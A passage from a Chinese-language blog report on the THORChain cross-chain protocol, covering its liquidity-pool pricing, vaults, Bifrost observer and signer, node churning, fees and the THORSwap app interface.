<li><p>资产汇率会趋于市场正常价格，示例：假设起初某个流动性提供者向RUNE:ETH池中注入了10个RUNE和1个ETH，K为10，汇率为10:1。而某个时刻市场实际汇率变为1:1，此时就会有大量投机者向池中注入ETH兑换RUNE，以套取高额利益。比如，投机者可以向池中注入3个ETH，为了满足公式，池中剩余的RUNE应该为<code>K/(1+3) = 10/4 = 2.5</code>，那么投机者将得到<code>10 - 2.5 = 7.5</code>个RUNE，而池中剩余2.5个RUNE和4个ETH，汇率逐渐趋于1:1。</p>
</li>
</ul>
<h3 id="跨链交易流程概述"><a href="#跨链交易流程概述" class="headerlink" title="跨链交易流程概述"></a>跨链交易流程概述</h3><p>假设用户需要用BTC交换ETH。</p>
<p>首先，用户需要向BTC上THORChain的 <strong>金库(Vaults)</strong> 发送一笔交易（THORChain在每个支持的应用链上都有一些金库，其本质是应用链上的一个账户地址）。在这笔交易中，用户需要指定跨链交易的目的链和目标地址。</p>
<p>当THORChain上的节点监听到金库收到一笔交易后，会通过<strong>bifrost协议</strong>将交易转换成THORChain上的交易，并广播到THORChain网络中。</p>
<p>当超大多数的节点对交易达成共识之后，交易会被执行。在本示例中，交易的类型是跨链交易，交易执行过程中会先从BTC:RUNE流动池中兑换出RUNE，再到ETH:RUNE流动池中兑换出ETH。</p>
<p>最终，THORChain会通过ETH上的金库向目标账户地址发起转账，跨链交易完成。</p>
<h3 id="2-2-核心功能"><a href="#2-2-核心功能" class="headerlink" title="2.2 核心功能"></a>2.2 核心功能</h3><h4 id="2-2-1-THORNode"><a href="#2-2-1-THORNode" class="headerlink" title="2.2.1 THORNode"></a>2.2.1 THORNode</h4><p>任何人可以向系统交纳担保资金来申请成为节点，请求通常会在几小时内被处理。当申请成功后，节点会加入系统白名单，为系统运行提供服务，并赚取收益。如果节点懒政或作恶，比如不发送交易、不提交区块、或打断签名，将会收到惩罚。节点可以在任何时候申请退出网络，当节点退出网络后，他的押金和获取的收益将会被退回。</p>
<p>一个节点需包含如下三大主要部分：</p>
<ol>
<li><p><strong>thornode</strong> - 连接THORChain。</p>
</li>
<li><p><strong>bifrost</strong> - 用于连接THORChain与应用链的协议。</p>
</li>
<li><p><strong>Full nodes</strong> - 应用链的全节点，用于连接应用链。</p>
</li>
</ol>
<p>目前，THORChain网络中有80多个THORNode。</p>
<h4 id="2-2-2-金库"><a href="#2-2-2-金库" class="headerlink" title="2.2.2 金库"></a>2.2.2 金库</h4><p>THORChain中存在两种类型的金库，这些金库分布在THORChain支持的各个应用链上，其本质就是应用链上的一个账户地址。</p>
<h4 id="入站金库Asgard-vaults"><a href="#入站金库Asgard-vaults" class="headerlink" title="入站金库Asgard vaults"></a>入站金库Asgard vaults</h4><p>入站金库用于接收用户的入站交易，每个THORChain支持的应用链上，通常都有1个入站金库，各个应用链上入站金库的地址可参考：<a href="https://midgard.thorchain.info/v2/thorchain/inbound_addresses" title="https://midgard.thorchain.info/v2/thorchain/inbound_addresses">https://midgard.thorchain.info/v2/thorchain/inbound_addresses</a>。</p>
<p>由于入站金库存储着大量资金，它的私钥需要系统中的节点通过门限签名TSS共同控制。任何有关入站金库的签名操作，包括入站交易的验证，都需要超大多数(67%)节点达成共识。由于共识过程较为耗时，为了提高系统效率，THORChain规定每40个节点管理1个入站金库，比如100个节点就有3个入站金库。THORChain会不断检查哪个入站金库更安全，并指示用户向该金库发送交易。</p>
<p>同时，入站金库是用户与THORChain进行互动的入口。用户可以通过对入站金库地址发送交易，来进行相关操作，比如：跨链交易、注入流动性等等。对于一笔发送给入站金库的交易，需包含如下内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span>        <span class="comment">// the user</span></span><br><span class="line">    <span class="attr">&quot;to&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span>          <span class="comment">// the vault</span></span><br><span class="line">    <span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span>      <span class="comment">// the amount to send (swap, add liquidity)</span></span><br><span class="line">    <span class="attr">&quot;memo&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span>        <span class="comment">// the transaction intent</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>其中，<code>memo</code>字段标明了用户需要进行的操作和相关参数，其格式如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">FUNCTION<span class="punctuation">:</span>PARAM1<span class="punctuation">:</span>PARAM2<span class="punctuation">:</span>PARAM3<span class="punctuation">:</span>PARAM4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>FUNCTION决定用户的操作，比如SWAP表示跨链交易、ADD表示注入流动性等。如果是SWAP操作，其格式要求如下：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_JwSThFcjGt.png" alt="1"></p>
<p>对于类EVM链，memo字段可通过payload传入；对于UTXO链，memo字段可通过输出脚本传入。</p>
<p>如果交易或memo字段格式错误，THORChain将会自动退还资产。</p>
<h4 id="出站金库Yggdrasil-Vaults"><a href="#出站金库Yggdrasil-Vaults" class="headerlink" title="出站金库Yggdrasil Vaults"></a>出站金库Yggdrasil Vaults</h4><p>出站金库用于在目的链上发送交易，在THORChain支持的应用链上都有分布。为了提高出站效率，每个THORNode都运行着一个出站金库，且单独由它管控，金库内的资金为THORNode抵押资金的25%。当节点退出网络时，需要将资金返还给入站金库。</p>
<h4 id="2-2-3-Bifrost协议"><a href="#2-2-3-Bifrost协议" class="headerlink" title="2.2.3 Bifröst协议"></a>2.2.3 Bifröst协议</h4><p>Bifrost定义了应用链如何与THORChain连接，它采用单向状态锚定(1-way State Pegs)的方式，从应用类同步状态到THORChain。</p>
<p>每个节点都会运行一个Bifrost服务，它包含Observer和Signer两大模块。</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_s9_L1l34Yg.png" alt="1"></p>
<p>Observer会通过THORNode上运行的应用链节点，监听应用链上入站金库的地址，当入站金库收到一笔有效交易时，它会将交易转换成THORChain上的见证交易(witness transaction)：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Tx <span class="keyword">struct</span> &#123;</span><br><span class="line">  ID          TxID    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">  Chain       Chain   <span class="string">`json:&quot;chain&quot;`</span></span><br><span class="line">  FromAddress Address <span class="string">`json:&quot;from_address&quot;`</span></span><br><span class="line">  ToAddress   Address <span class="string">`json:&quot;to_address&quot;`</span></span><br><span class="line">  Coins       Coins   <span class="string">`json:&quot;coins&quot;`</span></span><br><span class="line">  Gas         Gas     <span class="string">`json:&quot;gas&quot;`</span></span><br><span class="line">  Memo        <span class="type">string</span>  <span class="string">`json:&quot;memo&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_9JBUN36zRy.png" alt="1"></p>
<p>起初，见证交易的状态为<code>pending</code>，节点会将交易广播到网络中，当超大多数(67%)节点对交易达成共识后，交易状态变为<code>finalised</code>。对于finalised交易，系统会按照下图逻辑处理：交易排序，执行交易，指定出站金库，最终生成txOut（记录目的链、目标地址、出站金库等信息）。</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_Rpq4qxMaGu.png" alt="1"></p>
<p>Signer收到finalised交易后，会通过目标链客户端，将其转换成目标链上的交易，交易通过TSS模块完成签名，最终发送到目标链上。</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_j_QsTXJV0N.png" alt="1"></p>
<h4 id="2-2-4-搅动"><a href="#2-2-4-搅动" class="headerlink" title="2.2.4 搅动"></a>2.2.4 搅动</h4><p>系统中每3天或每50000区块，或者节点加入&#x2F;离开网络时，会触发一次搅动(Churning)。</p>
<p>当搅动发生后，会创建新的入站金库，由新节点控制，并将旧金库中的资金转移到新金库中。</p>
<p>在一次搅动事件中，满足以下条件的节点会被移出THORChain网络（但不会超过总节点的1&#x2F;3）：</p>
<ol>
<li><p>self-removal: 自己申请退出；</p>
</li>
<li><p>network-removal: 网络中其它节点决定将它移出；</p>
</li>
<li><p>oldest gets removed: 最早提交区块的（最懒的）；</p>
</li>
<li><p>accrued slash points for poor node operation: 做坏事被检测出的。</p>
</li>
</ol>
<p>而新的节点会被接入THORChain网络，缴纳担保金额多的节点优先被接入。接入后，节点数量最多比原先节点总数多1。</p>
<h4 id="2-2-5-费用"><a href="#2-2-5-费用" class="headerlink" title="2.2.5 费用"></a>2.2.5 费用</h4><p>当用户与THORChain交互时，他们需要考虑3种消耗：</p>
<ol>
<li><p>流动性池的手续费；</p>
</li>
<li><p>THORChain网络资源消耗（共识、处理交易等）；</p>
</li>
<li><p>目的链的网络资源消耗（交易手续费、gas费等）。</p>
</li>
</ol>
<p>对于每笔交易，THORChain会收取两种费用：</p>
<ol>
<li><p>固定的网络费用(Network Fee)：用于支付网络资源，包括目的链交易费用。</p>
</li>
<li><p>动态的流动性费用(Liquidity Fee)：用于支付给流动性池。</p>
</li>
</ol>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_Z-VrU_zINp.png" alt="1"></p>
<h3 id="2-3-项目生态现状与趋势"><a href="#2-3-项目生态现状与趋势" class="headerlink" title="2.3 项目生态现状与趋势"></a>2.3 项目生态现状与趋势</h3><p>现状：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_m6yHsc2xZa.png" alt="1"></p>
<p><a href="https://thorchain.org/ecosystem" title="生态系统">生态系统</a>：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/%E7%BD%91%E9%A1%B5%E6%8D%95%E8%8E%B7_18-7-2022_171527_thorchain.org_4NPUF1xvAd.jpeg" alt="1"></p>
<h3 id="2-4-产品Dapp体验"><a href="#2-4-产品Dapp体验" class="headerlink" title="2.4 产品Dapp体验"></a>2.4 产品Dapp体验</h3><p>跨链交易APP：<a href="https://app.thorswap.finance/swap" title="https://app.thorswap.finance/swap">https://app.thorswap.finance/swap</a></p>
<p>跨链交易讲解：<a href="https://docs.thorswap.finance/thorswap/how-tos/tutorials/sidebar-navigation" title="Navigate THORSwap - THORSwap">Navigate THORSwap - THORSwap</a></p>
<p>跨链交易首页：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_wnxQSe5dPH.png" alt="1"></p>
<p>用户可以同时连接多个钱包，因为跨链交易时需要一个发送一个接收：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_dkF2rQwLXk.png" alt="1"></p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_0j6rvGwQ7h.png" alt="1"></p>
<p>发送跨链交易：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_XMHKUDjdR7.png" alt="1"></p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_SfA5XGdOrY.png" alt="1"></p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_5f_ngRvaMQ.png" alt="1"></p>
<p>可以在设置中选择“指定接收方地址”，这样只需要连接发出代币的钱包地址：</p>
<p><img src="/THORChain%E9%A1%B9%E7%9B%AE%E8%B0%83%E7%A0%94/image_1zvjBRtaxV.png" alt="1"></p>
<h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3 参考"></a>3 参考</h2><ul>
<li><p><a href="https://thorchain.org/" title="官网">官网</a></p>
</li>
<li><p><a href="https://docs.thorchain.org/" title="官方文档">官方文档</a></p>
</li>
<li><p><a href="https://twitter.com/THORChain" title="Twitter">Twitter</a></p>
</li>
<li><p><a href="https://github.com/thorchain" title="Github">Github</a></p>
</li>
<li><p><a href="https://www.youtube.com/watch?v=dNDh-mPboPc&ab_channel=Finematics" title="How Does THORCHAIN Work? DEFI Explained - YouTube">How Does THORCHAIN Work? DEFI Explained - YouTube</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
</search>
